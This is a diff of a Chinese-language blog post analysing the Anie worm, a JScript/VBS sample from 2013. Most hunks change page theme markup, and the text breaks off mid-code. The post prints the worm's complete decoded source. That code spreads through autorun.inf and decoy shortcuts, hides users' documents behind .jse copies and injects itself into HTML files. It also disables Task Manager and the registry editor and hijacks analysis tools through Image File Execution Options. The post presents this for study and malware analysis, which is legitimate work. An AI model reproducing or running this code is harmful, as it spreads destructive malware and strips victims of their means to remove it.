@@ -1,15 +1,21 @@
 <!doctype html>
-<html class="theme-next use-motion theme-next-pisces">
-<head>
+
+
+
   
 
-<meta charset="UTF-8"/>
+
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 
 
+
 <meta http-equiv="Cache-Control" content="no-transform" />
 <meta http-equiv="Cache-Control" content="no-siteapp" />
+
 
 
   <meta name="google-site-verification" content="6O--eeoQkyybt3zj3XXCwFh4tp4KuMfjMLLuoxFqOFo" />
@@ -20,7 +26,11 @@
 
 
 
-  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>
+
 
 
 
@@ -29,16 +39,15 @@
   
 
 
-<link rel="stylesheet" type="text/css" href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" />
 
-<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.2"/>
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
 
-
-    <meta name="description" content="永远年轻，永远热泪盈眶！" />
-
+<link href="/css/main.css?v=5.0.0" rel="stylesheet" type="text/css" />
 
 
   <meta name="keywords" content="Worm," />
+
+
 
 
 
@@ -46,7 +55,15 @@
 
 
 
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.png?v=0.4.5.2" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.png?v=5.0.0" />
+
+
+
+
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 <meta name="description" content="Anie 是一个VBS蠕虫，命名源于其会创建一系列名为 Annie 的文件，鉴于计算机病毒命名时不应直接使用病毒样本中出现的字符串，所以将其命名为 Anie。该病毒最早出现的时间为2013年，国家为印尼。
@@ -71,32 +88,22 @@
 病毒名称：Worm.JS.AutoRun病毒类型：蠕虫样本长度：9,201 字节样本md5：4d1a9f7559de521e1458021a1a7df7cf文件类型：vbs原文件名：">
 
 
+
 <script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
   var CONFIG = {
     scheme: 'Pisces',
-    sidebar: 'post'
+    sidebar: '[object Object]',
+    fancybox: true,
+    motion: true
   };
 </script>
-
-
-
-
-<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
   <title> VBS蠕虫 Anie 代码分析 | lShang's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
-  <!--[if lte IE 8]>
-  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
-    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
-      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
-           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
-           style='margin-left:auto;margin-right:auto;display: block;'/>
-    </a>
-  </div>
-<![endif]-->
   
 
 
@@ -123,7 +130,12 @@
 
 
 
-  <div class="container one-column page-post-detail">
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -137,7 +149,7 @@
       <span class="logo-line-after"><i></i></span>
     </a>
   </div>
-  <p class="site-subtitle"></p>
+  <p class="site-subtitle">I love this world.</p>
 </div>
 
 <div class="site-nav-toggle">
@@ -161,16 +173,6 @@
               <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
             
             首页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories" rel="section">
-            
-              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
-            
-            分类
           </a>
         </li>
       
@@ -207,10 +209,11 @@
 
       
       
+      
         <li class="menu-item menu-item-search">
           <a href="#" class="st-search-show-outputs">
             
-              <i class="menu-item-icon fa fa-search icon-next-search fa-fw"></i> <br />
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
             
             搜索
           </a>
@@ -222,11 +225,9 @@
   
     <div class="site-search">
       
-  
   <form class="site-search-form">
-    <input type="text" id="st-search-input" class="st-search-input st-default-search-input" />
-  </form>
-
+  <input type="text" id="st-search-input" class="st-search-input st-default-search-input" />
+</form>
 
 <script type="text/javascript">
   (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
@@ -258,6 +259,10 @@
   
   
 
+  
+  
+  
+
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
 
     
@@ -277,7 +282,10 @@
 
         <div class="post-meta">
           <span class="post-time">
-            发表于
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
             <time itemprop="dateCreated" datetime="2015-03-14T16:49:47+08:00" content="2015-03-14">
               2015-03-14
             </time>
@@ -285,7 +293,11 @@
 
           
             <span class="post-category" >
-              &nbsp; | &nbsp; 分类于
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                   <a href="/categories/病毒分析/" itemprop="url" rel="index">
@@ -312,24 +324,30 @@
           
 
           
+
           
           
-             <span id="/2015/03/14/anie-vbs-worm-code-analysis/"class="leancloud_visitors"  data-flag-title="VBS蠕虫 Anie 代码分析">
-                &nbsp; | &nbsp; 阅读次数
-             </span>
+             <span id="/2015/03/14/anie-vbs-worm-code-analysis/" class="leancloud_visitors" data-flag-title="VBS蠕虫 Anie 代码分析">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
           
         </div>
       </header>
     
 
 
-    <div class="post-body">
+    <div class="post-body" itemprop="articleBody">
 
       
       
 
       
-        <span itemprop="articleBody"><p>Anie 是一个VBS蠕虫，命名源于其会创建一系列名为 Annie 的文件，鉴于计算机病毒命名时不应直接使用病毒样本中出现的字符串，所以将其命名为 Anie。<br>该病毒最早出现的时间为2013年，国家为印尼。</p>
+        <p>Anie 是一个VBS蠕虫，命名源于其会创建一系列名为 Annie 的文件，鉴于计算机病毒命名时不应直接使用病毒样本中出现的字符串，所以将其命名为 Anie。<br>该病毒最早出现的时间为2013年，国家为印尼。</p>
 <h1 id="基本信息">基本信息</h1><hr>
 <blockquote>
 <p>病毒名称：Worm.JS.AutoRun<br>病毒类型：蠕虫<br>样本长度：9,201 字节<br>样本md5：4d1a9f7559de521e1458021a1a7df7cf<br>文件类型：vbs<br>原文件名：Annie.sys<br>出现时间：2013-02-15<br>感染范围：Indonesia<br>感染目标：Intel 386 orlater processors and compatible processors</p>
@@ -339,7 +357,7 @@
 <p>直接用编辑器打开病毒样本，会发现样本内容为乱码，该样本使用了jscript.encode方式进行了加密，在<a href="http://www.sanxiang.org/jscript-decode.html" target="_blank" rel="external">这里</a>可以对其进行解密。<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/anie-vbs-worm-code-analysis/encoded.jpg" alt=""></p>
 <h1 id="代码分析">代码分析</h1><hr>
 <h2 id="免责声明">免责声明</h2><p>本节代码是一个完整的VBS蠕虫病毒，仅以学习和交流目的展示，其执行后会感染磁盘驱动器、CD刻录机、网络驱动器等，会对系统造成极大破坏。<br>请勿复制、传播、执行以及使用本节中代码进行攻击等，否则自行承担一切因不当行为造成的后果及责任。</p>
-<h2 id="病毒代码">病毒代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var fso = new ActiveXObject(&#39;Scripting.FileSystemObject&#39;);&#10;var Shell = new ActiveXObject(&#39;WScript.Shell&#39;);&#10;var ScriptPath = WScript.ScriptFullName;&#10;var Script = ReadText(ScriptPath);&#10;var SystemPath = fso.GetSpecialFolder(1);&#10;var SysPath = SystemPath + &#39;\\drivers\\annie.sys&#39;;&#10;&#10;function InfectDrives() &#123;&#10;    while (ScriptPath == SysPath) &#123;&#10;        // &#26522;&#20030;&#39537;&#21160;&#22120;&#38598;&#21512;&#10;        var e = new Enumerator(fso.Drives);&#10;        for (e.moveFirst(); !e.atEnd(); e.moveNext()) &#123;&#10;            var drv = e.item();&#10;            // DriveType:UnknownType&#65309;0&#65307;Removable&#65309;1&#65307;Fixed=2&#65307;Remote=3&#65307;CDRom=4.&#10;            // &#22914;&#26524;&#26159;&#30828;&#30424;&#25110;&#32773;&#31227;&#21160;&#23384;&#20648;&#20171;&#36136;&#24182;&#19988;&#39537;&#21160;&#22120;&#21495;&#19981;&#20026;&#39;A:&#39;&#24182;&#19988;&#39537;&#21160;&#22120;&#21487;&#20197;&#35775;&#38382;&#10;            if (((drv.DriveType == 1 || drv.DriveType == 2) &#38;&#38; drv.Path != &#39;A:&#39;) &#38;&#38; drv.IsReady) &#123;&#10;                // &#25335;&#36125;&#33050;&#26412;&#25991;&#20214;&#21040;&#39537;&#21160;&#22120;&#26681;&#30446;&#24405;&#65292;&#21629;&#21517;&#20026;annie.ani&#12290;&#10;                CopyScriptFile(drv.Path + &#39;\\annie.ani&#39;);&#10;                // &#21019;&#24314;AutoRun&#25991;&#20214;&#65292;&#23558;annie.ani&#35774;&#32622;&#20026;&#33258;&#21160;&#36816;&#34892;&#12290;&#10;                CreateAutoRunFile(drv.Path + &#39;\\autorun.inf&#39;);&#10;                CreateShortcut(drv.Path + &#39;\\&#39;);&#10;                InfectFolder(drv.Path + &#39;\\&#39;);&#10;                InfectSubFolder(drv.Path + &#39;\\&#39;);&#10;            &#125;&#10;        &#125;&#10;    &#125;&#10;&#125;&#10;&#10;function GetExtensionName(filename) &#123;&#10;    return fso.GetExtensionName(filename).toLowerCase();&#10;&#125;&#10;&#10;function TryOpenTheOriginalFile() &#123;&#10;    var path = ScriptPath.substr(0, ScriptPath.length - 4);&#10;    if (fso.FileExists(path + &#39;.docx&#39;)) &#123;&#10;        OpenTheOriginalFile(path, &#39;.docx&#39;);&#10;    &#125; else if (fso.FileExists(path + &#39;.doc&#39;)) &#123;&#10;        OpenTheOriginalFile(path, &#39;.doc&#39;);&#10;    &#125; else if (fso.FileExists(path + &#39;.rtf&#39;)) &#123;&#10;        OpenTheOriginalFile(path, &#39;.rtf&#39;);&#10;    &#125;&#10;&#125;&#10;&#10;function Install() &#123;&#10;    shell.run(&#39;cscript.exe //e:jscript &#39; + SysPath + &#39; /r&#39;, 0);&#10;    WScript.Sleep(100);&#10;    shell.run(&#39;cscript.exe //e:jscript &#39; + SysPath + &#39; /s&#39;, 0);&#10;    WScript.Sleep(100);&#10;    shell.Run(&#39;cscript.exe //e:jscript &#39; + SysPath + &#39; /n&#39;, 0);&#10;&#125;&#10;&#10;function GetFileSize(filename) &#123;&#10;    if (fso.FileExists(filename)) &#123;&#10;        return fso.GetFile(filename).Size;&#10;    &#125; else &#123;&#10;        return null;&#10;    &#125;&#10;&#125;&#10;&#10;function GetBaseName(filepath) &#123;&#10;    return fso.GetBaseName(filepath);&#10;&#125;&#10;&#10;function GetDocType(filepath) &#123;&#10;// &#33719;&#21462;html&#25991;&#20214;&#31532;&#19968;&#34892;&#25991;&#20214;&#31867;&#22411;&#35828;&#26126;&#10;    try &#123;&#10;        return fso.OpenTextFile(filepath, 1).ReadLine();&#10;    &#125; catch (e) &#123;&#10;        return null;&#10;    &#125;&#10;&#125;&#10;&#10;function TestAndRepair() &#123;&#10;    if (GetFileSize(SysPath) != 9201) &#123;&#10;        CopyScriptFile(SysPath);&#10;        shell.Run(&#39;wscript.exe //e:jscript &#39; + SysPath + &#39; /e&#39;);&#10;    &#125;&#10;&#125;&#10;&#10;function CreateAutoRunFile(filename) &#123;&#10;    var str = &#39;[autorun]\nshellexecute=wscript.exe //e:jscript annie.ani /a\nshell\\open\\command=wscript.exe //e:jscript annie.ani /a\nshell\\explore\\command=wscript.exe //e:jscript annie.ani /a&#39;;&#10;    if (ReadText(filename) != str) &#123;&#10;        SetFileNewAttributes(filename, 0);&#10;        try &#123;&#10;            var f = fso.CreateTextFile(filename, true);&#10;            f.Write(str);&#10;            f.Close();&#10;        &#125; catch (e) &#123;&#10;            if (fso.FolderExists(filename)) &#123;&#10;                DeleteFolder(filename);&#10;                CreateAutoRunFile(filename);&#10;            &#125;&#10;        &#125; finally &#123;&#10;            SetFileNewAttributes(filename, 39);&#10;        &#125;&#10;    &#125;&#10;&#125;&#10;&#10;function ReadText(filename) &#123;&#10;    try &#123;&#10;        return fso.OpenTextFile(filename, 1).ReadAll();&#10;    &#125; catch (e) &#123;&#10;        return &#39;&#39;;&#10;    &#125;&#10;&#125;&#10;&#10;&#10;function SetFileNewAttributes(filename, newattributes) &#123;&#10;// newattributes &#21487;&#29992;&#20540;&#10;// &#24120;&#25968;          &#20540;     &#25551;&#36848;&#10;// Normal        0      &#26222;&#36890;&#25991;&#20214;&#12290;&#27809;&#26377;&#35774;&#32622;&#20219;&#20309;&#23646;&#24615;&#12290;&#10;// ReadOnly      1      &#21482;&#35835;&#25991;&#20214;&#12290;&#21487;&#35835;&#20889;&#12290;&#10;// Hidden        2      &#38544;&#34255;&#25991;&#20214;&#12290;&#21487;&#35835;&#20889;&#12290;&#10;// System        4      &#31995;&#32479;&#25991;&#20214;&#12290;&#21487;&#35835;&#20889;&#12290;&#10;// Directory     16     &#25991;&#20214;&#22841;&#25110;&#30446;&#24405;&#12290;&#21482;&#35835;&#12290;&#10;// Archive       32     &#19978;&#27425;&#22791;&#20221;&#21518;&#24050;&#26356;&#25913;&#30340;&#25991;&#20214;&#12290;&#21487;&#35835;&#20889;&#12290;&#10;// Alias         1024   &#38142;&#25509;&#25110;&#24555;&#25463;&#26041;&#24335;&#12290;&#21482;&#35835;&#12290;&#10;// Compressed    2048   &#21387;&#32553;&#25991;&#20214;&#12290;&#21482;&#35835;&#12290;&#10;    if (fso.FileExists(filename)) &#123;&#10;        try &#123;&#10;            var f = fso.GetFile(filename);&#10;            f.Attributes = newattributes ;&#10;        &#125; catch (e) &#123;&#125;&#10;    &#125;&#10;&#125;&#10;&#10;function ChangeJseRge(item) &#123;&#10;// &#20462;&#25913;.JSE&#25991;&#20214;&#30340;&#40664;&#35748;&#20540;&#12289;&#40664;&#35748;&#22270;&#26631;&#31561;&#27880;&#20876;&#34920;&#20449;&#24687;&#10;    shell.RegWrite(&#39;HKCR\\&#39; + RegReadItem(&#39;.JSE&#39;) + &#39;\\&#39;, RegReadItem(RegReadItem(item) + &#39;\\&#39;));&#10;    shell.RegWrite(&#39;HKCR\\&#39; + RegReadItem(&#39;.JSE&#39;) + &#39;\\DefaultIcon\\&#39;, RegReadItem(RegReadItem(item) + &#39;\\DefaultIcon\\&#39;));&#10;    shell.RegWrite(&#39;HKCR\\&#39; + RegReadItem(&#39;.JSE&#39;) + &#39;\\FriendlyTypeName&#39;, RegReadItem(RegReadItem(item) + &#39;\\&#39;), &#39;REG_EXPAND_SZ&#39;);&#10;&#125;&#10;&#10;function OpenTheOriginalFile(path, file_type) &#123;&#10;    try &#123;&#10;        var open_command = RegReadItem(RegReadItem(file_type) + &#39;\\shell\\Open\\command&#39;);&#10;        if (open_command.match(/%1/) != null) &#123;&#10;            shell.Run(open_command.replace(&#39;%1&#39;, path + file_type));&#10;        &#125; else &#123;&#10;            shell.Run(open_command + &#39; &#34;&#39; + path + file_type + &#39;&#34;&#39;);&#10;        &#125;&#10;    &#125; catch (e) &#123;&#125;&#10;&#125;&#10;&#10;function HideAndDisguise() &#123;&#10;    while (ScriptPath == SysPath) &#123;&#10;        CopyScriptFile(SysPath);&#10;        InfectCDBuring();&#10;        InfectReg();&#10;        DisguiseJse();&#10;        WScript.Sleep(1000);&#10;    &#125;&#10;&#125;&#10;&#10;function DisguiseJse() &#123;&#10;// &#20462;&#25913;.jse&#25991;&#20214;&#30340;&#27880;&#20876;&#34920;&#20449;&#24687;&#36827;&#34892;&#20266;&#35013;&#10;    try &#123;&#10;        ChangeJseReg(&#39;.docx&#39;);&#10;    &#125; catch (e) &#123;&#10;        try &#123;&#10;            ChangeJseReg(&#39;.doc&#39;);&#10;        &#125; catch (e) &#123;&#10;            try &#123;&#10;                ChangeJseReg(&#39;.rtf&#39;);&#10;            &#125; catch (e) &#123;&#125;&#10;        &#125;&#10;    &#125;&#10;&#125;&#10;&#10;function InfectSubFolder(path) &#123;&#10;    // &#26522;&#20030;&#23376;&#30446;&#24405;&#10;    var e = new Enumerator(fso.GetFolder(path).SubFolders);&#10;    for (e.moveFirst(); !e.atEnd(); e.moveNext()) &#123;&#10;        var folder = e.item();&#10;        // GetSpecialFolder(0) &#36820;&#22238;WindowsFolder&#36335;&#24452;&#10;        if ((folder.Name != &#39;RECYCLER&#39; &#38;&#38; folder.Name != &#39;System Volume Information&#39;) &#38;&#38; folder.Path != fso.GetSpecialFolder(0)) &#123;&#10;            InfectFolder(folder.Path);&#10;            InfectSubFolder(folder.Path);&#10;        &#125;&#10;    &#125;&#10;&#125;&#10;&#10;function CreateShortcut(path) &#123;&#10;    for (var i = 1; i &#60;= 5; i++) &#123;&#10;        var lnkname = path + &#39;beautiful_girl_part_&#39; + i + &#39;.lnk&#39;;&#10;        if (!fso.FileExists(lnkname)) &#123;&#10;            try &#123;&#10;                var shortcut = shell.CreateShortcut(lnkname);&#10;                shortcut.IconLocation = &#39;wmploc.dll,8&#39;;&#10;                shortcut.TargetPath = &#39;wscript.exe&#39;;&#10;                shortcut.Arguments = &#39;//e:jscript annie.ani &#39; + &#39;/q:&#39; + i;&#10;                shortcut.Save();&#10;            &#125; catch (e) &#123;&#125;&#10;        &#125;&#10;    &#125;&#10;&#125;&#10;&#10;function EditHTML(filepath) &#123;&#10;    var str = &#39;&#60;!--[ANNIE83E333BF08546819]--&#62;&#39;;&#10;    if (GetDocType(filepath) != str) &#123;&#10;        var text = ReadText(filepath);&#10;        // &#25152;&#26377;&#26012;&#32447;&#26367;&#25442;&#25104;&#21452;&#26012;&#32447;&#10;        var ki4io = script.replace(/\\/g, &#39;\\\\&#39;);&#10;        // &#25152;&#26377;&#21333;&#24341;&#21495;&#26367;&#25442;&#20026;&#24102;&#36716;&#20041;&#23383;&#31526;&#30340;&#21333;&#24341;&#21495;&#10;        var v0l9m = ki4io.replace(/\&#39;/g, &#39;\\\&#39;&#39;);&#10;        // &#23558;&#33050;&#26412;&#25554;&#20837;html&#20195;&#30721;&#20013;&#10;        var html = &#39;&#60;html&#62;\n&#60;script type=&#34;text/javascript&#34;&#62;\n&#60;!--\nvar ayfp6=new ActiveXObject(\&#39;Scripting.FileSystemObject\&#39;);var dk5h8=new ActiveXObject(\&#39;WScript.Shell\&#39;);var s41k8=ayfp6.GetSpecialFolder(2);var bgw3u=ayfp6.GetTempName();var vlx8c=\&#39;&#39; + v0l9m + &#39;\&#39;+String.fromCharCode(0);var rwyg5=ayfp6.CreateTextFile(s41k8+\&#39;\\\\\&#39;+bgw3u,true);rwyg5.Write(vlx8c);rwyg5.Close();dk5h8.Run(\&#39;wscript.exe //e:jscript \&#39;+s41k8+\&#39;\\\\\&#39;+bgw3u+\&#39; /t\&#39;);\n//--&#62;\n&#60;/script&#62;\n&#60;/html&#62;&#39;;&#10;        SetFileNewAttributes(filepath, 0);&#10;        try &#123;&#10;            // &#23558;&#29983;&#25104;&#30340;DocType&#26631;&#24535;&#21450;HTML&#20195;&#30721;&#21152;&#20837;&#21040;&#21407;&#25991;&#20214;&#20013;&#10;            var file = fso.OpenTextFile(filepath, 2);&#10;            file.WriteLine(str);&#10;            file.WriteLine(text);&#10;            file.WriteLine(html);&#10;            file.Close();&#10;        &#125; catch (e) &#123;&#125;&#10;    &#125;&#10;&#125;&#10;&#10;function InfectFolder(path) &#123;&#10;    // &#26522;&#20030;&#36335;&#24452;&#19979;&#25991;&#20214;&#10;    var e = new Enumerator(fso.GetFolder(path).Files);&#10;    for (e.moveFirst(); !e.atEnd(); e.moveNext()) &#123;&#10;        var filepath = e.item().Path;&#10;        // &#22914;&#26524;&#25193;&#23637;&#21517;&#20026;&#39;doc&#39;&#12289;&#39;docx&#39;&#12289;&#39;ref&#39;&#24182;&#19988;&#25991;&#20214;&#27809;&#26377;&#25171;&#24320;&#10;        if ((GetExtensionName(filepath) == &#39;doc&#39; || GetExtensionName(filepath) == &#39;docx&#39; || GetExtensionName(filepath) == &#39;rtf&#39;) &#38;&#38; GetBaseName(filepath).substr(0, 2) != &#39;~$&#39;) &#123;&#10;            // &#25335;&#36125;&#33050;&#26412;&#25991;&#20214;&#36335;&#24452;&#19979;&#65292;&#25991;&#20214;&#21517;&#20026;&#24050;&#23384;&#22312;office&#25991;&#20214;&#21517;&#65292;&#25193;&#23637;&#21517;&#20026;&#39;.jse&#39;&#10;            CopyScriptFile(path + &#39;\\&#39; + GetBaseName(filepath) + &#39;.jse&#39;);&#10;            // &#38544;&#34255;&#21407;&#25991;&#20214;&#10;            SetFileNewAttributes(filepath, 38);&#10;        &#125; else if (GetExtensionName(filepath) == &#39;htm&#39; || GetExtensionName(filepath) == &#39;html&#39;) &#123; // &#22914;&#26524;&#25193;&#23637;&#21517;&#20026;&#39;htm&#39; &#25110; &#39;html&#39;&#10;            // &#32534;&#36753;HTML&#25991;&#20214;&#65292;&#23558;&#33050;&#26412;&#20195;&#30721;&#25554;&#20837;&#36827;&#21435;&#10;            EditHTML(filepath);&#10;        &#125;&#10;        WScript.Sleep(4);&#10;    &#125;&#10;&#125;&#10;&#10;function RegReadItem(item) &#123;&#10;    return shell.RegRead(&#39;HKCR\\&#39; + item + &#39;\\&#39;);&#10;&#125;&#10;&#10;function InfectNetworkDrives() &#123;&#10;    while (ScriptPath == SysPath) &#123;&#10;        try &#123;&#10;            var network = new ActiveXObject(&#39;WScript.Network&#39;);&#10;            var e = network.EnumNetworkDrives();&#10;            for (var i = 1; i &#60; e.length; i += 2) &#123;&#10;                CopyScriptFile(e.Item(i) + &#39;\\annie.ani&#39;);&#10;                CreateShortcut(e.Item(i) + &#39;\\&#39;);&#10;                InfectFolder(e.Item(i) + &#39;\\&#39;);&#10;            &#125;&#10;        &#125; catch (e) &#123;&#125;&#10;        WScript.Sleep(900000);&#10;    &#125;&#10;&#125;&#10;&#10;function CopyScriptFile(filename) &#123;&#10;    // &#22914;&#26524;&#25991;&#20214;&#22823;&#23567;&#19981;&#20026;9201&#10;    if (GetFileSize(filename) != 9201) &#123;&#10;        // &#35774;&#32622;&#25991;&#20214;&#23646;&#24615;&#20026;Normal&#10;        SetFileNewAttributes(filename, 0);&#10;        try &#123;&#10;            // &#23581;&#35797;&#37325;&#20889;&#25991;&#20214;&#10;            var f = fso.CreateTextFile(filename, true);&#10;            f.Write(script);&#10;            f.Close();&#10;        &#125; catch (e) &#123;   // &#22914;&#26524;&#37325;&#20889;&#22833;&#36133;&#10;            // &#22914;&#26524;&#25991;&#20214;&#36335;&#24452;&#20026;&#25991;&#20214;&#22841;&#10;            if (fso.FolderExists(filename)) &#123;&#10;                // &#21024;&#38500;&#25991;&#20214;&#22841;&#10;                DeleteFolder(filename);&#10;                // &#37325;&#26032;&#25335;&#36125;&#33050;&#26412;&#25991;&#20214;&#10;                CopyScriptFile(filename);&#10;            &#125;&#10;        &#125; finally &#123;&#10;            // &#22914;&#26524;&#25991;&#20214;&#25193;&#23637;&#21517;&#19981;&#20026;&#39;jse&#39;&#10;            if (GetExtensionName(filename) != &#39;jse&#39;) &#123;&#10;                // &#35774;&#32622;&#25991;&#20214;&#23646;&#24615;&#20026; &#39;ReadOnly | Hidden | System | Archive&#39;&#10;                SetFileNewAttributes(filename, 39);&#10;            &#125;&#10;        &#125;&#10;    &#125;&#10;&#125;&#10;&#10;function InfectCDBuring() &#123;&#10;    try &#123;&#10;        var e9hgn = shell.RegRead(&#39;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\CD Burning&#39;);&#10;        CopyScriptFile(e9hgn + &#39;\\annie.ani&#39;);&#10;        CreateAutoRunFile(e9hgn + &#39;\\autorun.inf&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;&#125;&#10;&#10;function DeleteFolder(filename) &#123;&#10;    try &#123;&#10;        fso.DeleteFolder(filename, true);&#10;    &#125; catch (e) &#123;&#10;        shell.Run(&#39;cmd.exe /c rd /s /q \\\\.\\&#34;&#39; + filename + &#39;&#34;&#39;, 0, true);&#10;    &#125;&#10;&#125;&#10;&#10;function InfectReg() &#123;&#10;    try &#123;&#10;        // &#21024;&#38500;&#21491;&#38190;&#25171;&#24320;&#26041;&#24335;&#10;        shell.RegDelete(&#39;HKCR\\*\\shellex\\ContextMenuHandlers\\Open With\\&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#20462;&#25913;&#39;.inf&#39;&#25991;&#20214;&#23433;&#35013;&#26041;&#24335;&#65292;&#23433;&#35013;&#37197;&#32622;&#25991;&#20214;&#26102;&#21024;&#38500;&#37197;&#32622;&#25991;&#20214;&#10;        shell.RegWrite(&#39;HKCR\\&#39; + RegReadItem(&#39;.inf&#39;) + &#39;\\shell\\Install\\command\\&#39;, &#39;cmd.exe /c del /q /f &#34;%1&#34;&#39;, &#39;REG_EXPAND_SZ&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#20462;&#25913;&#39;.jse&#39;&#25991;&#20214;&#30340;&#25171;&#24320;&#26041;&#24335;&#10;        shell.RegWrite(&#39;HKCR\\&#39; + RegReadItem(&#39;.JSE&#39;) + &#39;\\Shell\\Edit\\Command\\&#39;, RegReadItem(RegReadItem(&#39;.JSE&#39;) + &#39;\\Shell\\Open\\Command\\&#39;), &#39;REG_EXPAND_SZ&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        shell.RegDelete(&#39;HKCR\\&#39; + RegReadItem(&#39;.JSE&#39;) + &#39;\\Shell\\Open2\\&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        shell.RegDelete(&#39;HKCR\\&#39; + RegReadItem(&#39;.JSE&#39;) + &#39;\\Shell\\Open2\\Command\\&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        shell.RegDelete(&#39;HKCR\\&#39; + RegReadItem(&#39;.JSE&#39;) + &#39;\\ShellEx\\PropertySheetHandlers\\WSHProps\\&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#20462;&#25913;&#39;.reg&#39;&#25991;&#20214;&#30340;&#25171;&#24320;&#26041;&#24335;&#65292;&#25171;&#24320;&#21363;&#21024;&#38500;&#10;        shell.RegWrite(&#39;HKCR\\&#39; + RegReadItem(&#39;.reg&#39;) + &#39;\\shell\\open\\command\\&#39;, &#39;cmd.exe /c del /q /f &#34;%1&#34;&#39;, &#39;REG_EXPAND_SZ&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#31105;&#27490;&#29992;&#25143;&#20462;&#25913;&#25991;&#20214;&#23646;&#24615;&#10;        shell.RegWrite(&#39;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoFileAssociate&#39;, &#39;1&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#31105;&#29992;&#27880;&#20876;&#34920;&#32534;&#36753;&#22120;&#10;        shell.RegWrite(&#39;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools&#39;, &#39;1&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#31105;&#29992;&#20219;&#21153;&#31649;&#29702;&#22120;&#10;        shell.RegWrite(&#39;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr&#39;, &#39;1&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#31105;&#29992;&#32452;&#31574;&#30053;&#31649;&#29702;&#22120;&#10;        shell.RegWrite(&#39;HKCU\\Software\\Policies\\Microsoft\\MMC\\RestrictToPermittedSnapins&#39;, &#39;1&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#26144;&#20687;&#21163;&#25345;attrib.exe&#65292;&#19981;&#22238;&#26174;&#20449;&#24687;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\attrib.exe\\Debugger&#39;, &#39;cmd.exe /c rem&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#26144;&#20687;&#21163;&#25345;autoruns.exe&#65292;&#21551;&#21160;&#21363;&#21024;&#38500;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns.exe\\Debugger&#39;, &#39;cmd.exe /c del /q /f&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;    try &#123;&#10;        // &#26144;&#20687;&#21163;&#25345;procexp.exe&#65292;&#21551;&#21160;&#21363;&#21024;&#38500;&#10;        